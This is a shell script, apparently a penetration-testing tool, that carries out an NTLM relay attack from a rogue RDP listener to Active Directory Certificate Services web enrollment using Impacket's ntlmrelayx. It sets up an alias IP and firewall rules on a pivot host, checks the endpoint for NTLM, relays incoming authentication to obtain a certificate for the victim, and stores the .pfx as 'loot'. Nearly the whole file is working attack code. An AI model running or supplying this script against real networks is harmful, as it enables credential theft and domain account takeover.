#!/bin/sh
# Run as root on an authorized pivot host with an RDP-capable Impacket build.
set -eu

IMPACKET_DIR=${IMPACKET_DIR:?set IMPACKET_DIR to the Impacket source checkout}
IFACE=${IFACE:?set IFACE to the internal network interface}
ALIAS_IP=${ALIAS_IP:?set ALIAS_IP to the temporary RDP listener address}
SOURCE_IP=${SOURCE_IP:?set SOURCE_IP to the permitted RDP client address}
ADCS_URL=${ADCS_URL:?set ADCS_URL to the AD CS Web Enrollment URL}
OUTPUT_OWNER=${OUTPUT_OWNER:?set OUTPUT_OWNER to a local account}

PYTHON_BIN=${PYTHON_BIN:-python3}
RDP_PORT=${RDP_PORT:-3389}
CERT_TEMPLATE=${CERT_TEMPLATE:-User}
WINDOW_SECONDS=${WINDOW_SECONDS:-120}
OUT=${OUT:-/tmp/rdp-adcs-relay}
case "$OUT" in
    /*) ;;
    *) OUT="$(pwd)/$OUT" ;;
esac
LOOT=${OUT}-loot
LOG=${OUT}.log
HEADERS=${OUT}-preflight.headers
address_added=0
accept_rule_added=0
drop_rule_added=0

port_is_listening() {
    ss -H -lnt | awk -v suffix=":$RDP_PORT" \
        '$4 ~ (suffix "$") { found=1 } END { exit found ? 0 : 1 }'
}

cleanup() {
    if [ "$accept_rule_added" = 1 ]; then
        iptables -D INPUT -i "$IFACE" -s "$SOURCE_IP" -d "$ALIAS_IP" \
            -p tcp --dport "$RDP_PORT" -j ACCEPT 2>/dev/null || true
    fi
    if [ "$drop_rule_added" = 1 ]; then
        iptables -D INPUT -i "$IFACE" -d "$ALIAS_IP" \
            -p tcp --dport "$RDP_PORT" -j DROP 2>/dev/null || true
    fi
    if [ "$address_added" = 1 ]; then
        ip address del "$ALIAS_IP/32" dev "$IFACE" 2>/dev/null || true
    fi
    if id "$OUTPUT_OWNER" >/dev/null 2>&1; then
        chown "$OUTPUT_OWNER" "$LOG" "$HEADERS" 2>/dev/null || true
        chown -R "$OUTPUT_OWNER" "$LOOT" 2>/dev/null || true
        chmod 0700 "$LOOT" 2>/dev/null || true
        find "$LOOT" -type f -exec chmod 0600 {} + 2>/dev/null || true
    fi
    printf 'cleanup alias='
    if ip -o address show dev "$IFACE" | grep -Fq " $ALIAS_IP/"; then
        echo present
    else
        echo absent
    fi
    printf 'cleanup listener='
    if port_is_listening; then
        echo present
    else
        echo absent
    fi
}
trap cleanup EXIT HUP INT TERM

[ "$(id -u)" = 0 ] || { echo "root required" >&2; exit 1; }
[ -f "$IMPACKET_DIR/examples/ntlmrelayx.py" ] || {
    echo "ntlmrelayx.py missing" >&2
    exit 1
}
id "$OUTPUT_OWNER" >/dev/null 2>&1 || {
    echo "OUTPUT_OWNER is not a local account" >&2
    exit 1
}
ip link show dev "$IFACE" >/dev/null 2>&1 || {
    echo "IFACE does not exist" >&2
    exit 1
}
if ip -o address show dev "$IFACE" | grep -Fq " $ALIAS_IP/"; then
    echo "alias already configured" >&2
    exit 1
fi

probe_rc=0
if command -v arping >/dev/null 2>&1; then
    arping -D -I "$IFACE" -c 2 -w 3 "$ALIAS_IP" >/dev/null 2>&1 ||
        probe_rc=$?
else
    # Send RFC 5227-style ARP probes when arping is unavailable.
    "$PYTHON_BIN" - "$IFACE" "$ALIAS_IP" <<'PY' || probe_rc=$?
import fcntl
import select
import socket
import struct
import sys
import time

iface, target = sys.argv[1:]
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((iface, 0))
mac = fcntl.ioctl(
    s.fileno(), 0x8927, struct.pack("256s", iface.encode()))[18:24]
target_ip = socket.inet_aton(target)
frame = (b"\xff" * 6 + mac + struct.pack("!H", 0x0806) +
         struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + mac + b"\0" * 4 +
         b"\0" * 6 + target_ip)
deadline = time.monotonic() + 3
for _ in range(2):
    s.send(frame)
    time.sleep(0.2)
while time.monotonic() < deadline:
    ready, _, _ = select.select(
        [s], [], [], max(0, deadline - time.monotonic()))
    if not ready:
        break
    packet = s.recv(2048)
    claimed = len(packet) >= 42 and packet[28:32] == target_ip
    competing_probe = (len(packet) >= 42 and
                       packet[28:32] == b"\0" * 4 and
                       packet[38:42] == target_ip and
                       packet[22:28] != mac)
    if (len(packet) >= 42 and packet[12:14] == b"\x08\x06" and
            (claimed or competing_probe)):
        sys.exit(1)
sys.exit(0)
PY
fi
if [ "$probe_rc" -ne 0 ]; then
    echo "duplicate host answered for $ALIAS_IP" >&2
    exit 1
fi
if port_is_listening; then
    echo "RDP_PORT is already listening" >&2
    exit 1
fi
if [ -e "$LOG" ] || [ -e "$LOOT" ] || [ -e "$HEADERS" ]; then
    echo "OUT artifacts already exist" >&2
    exit 1
fi

curl -sS --max-time 10 -o /dev/null -D "$HEADERS" "$ADCS_URL"
grep -qi '^WWW-Authenticate:.*NTLM' "$HEADERS" || {
    echo "AD CS NTLM preflight failed" >&2
    exit 1
}
mkdir -m 0700 "$LOOT"
ip address add "$ALIAS_IP/32" dev "$IFACE"
address_added=1
iptables -I INPUT 1 -i "$IFACE" -d "$ALIAS_IP" \
    -p tcp --dport "$RDP_PORT" -j DROP
drop_rule_added=1
iptables -I INPUT 1 -i "$IFACE" -s "$SOURCE_IP" -d "$ALIAS_IP" \
    -p tcp --dport "$RDP_PORT" -j ACCEPT
accept_rule_added=1

cd "$IMPACKET_DIR"
rc=0
PYTHONPATH="$IMPACKET_DIR" PYTHONUNBUFFERED=1 \
timeout --foreground "$WINDOW_SECONDS" "$PYTHON_BIN" examples/ntlmrelayx.py \
    -ts -debug -ip "$ALIAS_IP" --rdp-port "$RDP_PORT" \
    -t "$ADCS_URL" \
    --no-smb-server --no-http-server --no-wcf-server --no-raw-server \
    --no-rpc-server --no-winrm-server --no-mssql-server --no-multirelay \
    --adcs --template "$CERT_TEMPLATE" -l "$LOOT" -of "$OUT" \
    >"$LOG" 2>&1 || rc=$?

pfx=$(find "$LOOT" -maxdepth 1 -type f -name '*.pfx' -size +0c -print -quit)
if [ -n "$pfx" ] && grep -q 'GOT CERTIFICATE!' "$LOG"; then
    echo "terminal_result=certificate_issued rc=$rc pfx=$pfx"
    sha256sum "$pfx"
else
    echo "terminal_result=no_certificate rc=$rc log=$LOG" >&2
    exit 1
fi
